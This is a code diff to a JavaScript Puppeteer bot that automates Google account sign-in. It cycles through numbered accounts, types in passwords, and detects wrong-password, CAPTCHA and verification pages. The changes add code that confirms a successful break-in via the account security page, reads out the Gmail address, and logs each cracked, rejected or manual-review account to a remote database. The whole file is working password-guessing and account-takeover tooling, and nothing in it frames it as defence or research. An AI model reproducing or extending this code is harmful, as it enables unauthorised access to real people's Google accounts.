@@ -19,6 +19,9 @@ module.exports = class {
         mNumber = 0
         this.mPasswordTry = 0
         this.mCapture = false
+        this.mLoadPassword = false
+        this.mLogoutGmail = false
+        this.mGmailCheck = false
         mNumber = 0
         this.mLoad = 0
         this.mSirial = 0
@@ -63,6 +66,7 @@ module.exports = class {
                         } else {
                             this.mSirial = parseInt(value['start_'+this.SIZE])
                             mNumber = parseInt(value['runing_'+this.SIZE])
+                            //mNumber = 1748043876
                         }
                         
                         if(mNumber == 0) {
@@ -181,7 +185,7 @@ module.exports = class {
                         }
                     }
                 } else if(url.startsWith('https://accounts.google.com/_/signin/challenge')) {
-                    await this.delay(2000)
+                    await this.delay(1000)
                     const output = await this.page.evaluate(() => {
                         let root = document.querySelector('div.OyEIQ.uSvLId')
                         if(root && (root.innerHTML.includes('Wrong password. Try again or click Forgot password to reset it') || root.innerHTML.includes('Your password was changed'))) {
@@ -193,20 +197,6 @@ module.exports = class {
                     
                     if(output) {
                         await this.checkPassword()
-                    } else {
-                        mNumber++
-                        this.mLoad++
-                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
-                        if(this.mPasswordTry > 0) {
-                            console.log('ID: '+this.SIZE+' --- Gmail got it')
-                            this.database.child('active').child(mNumber-1).set(this.mPasswordTry-1)
-    
-                            this.mPasswordTry = 0
-                            await this.delay(1000)
-                            await this.page.setCookie(...[])
-                            await this.delay(2000)
-                            await this.page.goto(this.signin)
-                        }
                     }
                 } else if(url.startsWith('https://accounts.google.com/Captcha')) {
                     if(!this.mCapture) {
@@ -231,14 +221,103 @@ module.exports = class {
                             await this.page.goto(this.signin)
                         }
                     }
+                } else if(this.mLoadPassword) {
+                    let pageUrl = this.page.url()
+                    if(pageUrl == 'https://myaccount.google.com/security' || pageUrl.startsWith('https://gds.google.com/web/chip') || pageUrl.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
+                        this.mLoadPassword = false
+                        this.mGmailCheck = true
+                        if(pageUrl != 'https://myaccount.google.com/security') {
+                            await this.page.goto('https://myaccount.google.com/security')
+                        }
+                    } else {
+                        await this.delay(2000)
+                        const header = await this.page.evaluate(() => {
+                            let root = document.querySelector('#headingText')
+                            if(root) {
+                                let text = root.innerText
+                                if(text.includes(`Verify it’s you`)) {
+                                    root = document.querySelectorAll('li.JDAKTe.cd29Sd.zpCp3.SmR8')
+                                    if(root) {
+                                        for(let i=0; i<root.length; i++) {
+                                            if(root[i].innerText.includes('Use another phone or computer to finish signing in')) {
+                                                return '1'
+                                            }
+                                        }
+                                    }
+                                    return '2'
+                                } else if(text.includes(`Couldn’t sign you in`)) {
+                                    return '3'
+                                } else if(text.includes(`2-Step Verification`)){
+                                    return '4'
+                                } else if(text.includes('Your account has been disabled')) {
+                                    return '5'
+                                }
+                            }
+                            return '0'
+                        })
+    
+                        if(header != 0 && this.mLoadPassword) {
+                            this.mLoadPassword = false
+                            mNumber++
+                            this.mLoad++
+                            this.mPasswordTry = 0
+                            if(header == 1) {
+                                this.database.child('menually').child(mNumber-1).set(this.mPasswordTry-1)
+                            } else {
+                                this.database.child('reject').child(mNumber-1).set(this.mPasswordTry-1)
+                            }
+                            this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                            this.page.goBack()
+                        }
+                    }
+                } else if(this.mGmailCheck) {
+                    const gmail = await this.page.evaluate(() => {
+                        let root = document.querySelector('#yDmH0d > div.gb_ce > div > div:nth-child(3)')
+                        if(root) {
+                            return root.innerText
+                        } else {
+                            return null
+                        }
+                    })
+    
+                    if(gmail && this.mGmailCheck) {
+                        this.mGmailCheck = false
+                        mNumber++
+                        this.mLoad++
+                        this.mPasswordTry = 0
+                        this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(mNumber)
+                        this.database.child('gmail').child(mNumber-1).set(this.mPasswordTry-1)
+                        await this.delay(1000)
+                        let temp = JSON.parse(fs.readFileSync('./cookies.json'))
+                        await this.page.setCookie(...temp)
+                        this.mLogoutGmail = true
+                        this.mGmailAdress = gmail
+                        await this.page.goto(this.signin)
+                    }
+                } else if(this.mLogoutGmail) {
+                    const sinout = await this.page.evaluate(() => {
+                        let root = document.querySelector('#headingText')
+                        if(root && root.innerText.includes(`Choose an account`)) {
+                            return true
+                        } else {
+                            return false
+                        }
+                    })
+                    
+                    if(sinout && this.mLogoutGmail) {
+                        this.mLogoutGmail = false
+                        await this.page.evaluate(() => document.querySelector('ul.OVnw0d > li:nth-child(3) > div').click())
+                        await this.delay(1000)
+                        await this.page.evaluate(() => document.querySelector('ul.OVnw0d > li:nth-child(1) > div > div.n3x5Fb').click())
+                        await this.delay(1000)
+                        await this.page.evaluate(() => document.querySelector('div.ZFr60d.CeoRYc').click())
+                    }
                 }
             })
 
             this.page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
             
-            await this.page.goto(this.signin).catch(err => {
-                console.log('error')
-            })
+            await this.page.goto(this.signin)
 
             mLoadSuccess = true
     
@@ -251,6 +330,7 @@ module.exports = class {
             this.mPasswordTry = 0
             mNumber++
             this.mLoad++
+            this.mLoadPassword = false
             if(parseInt(this.mSirial)+1 <= parseInt(mNumber/1000000)) {
                 this.database.child('server').child(this.SERVER).child('runing_'+this.SIZE).set(0)
             } else {
@@ -272,6 +352,7 @@ module.exports = class {
             await this.page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass, password)
             this.mPasswordTry++
             await this.page.evaluate(() => document.querySelector('#passwordNext').click())
+            this.mLoadPassword = true
         }
     }
 
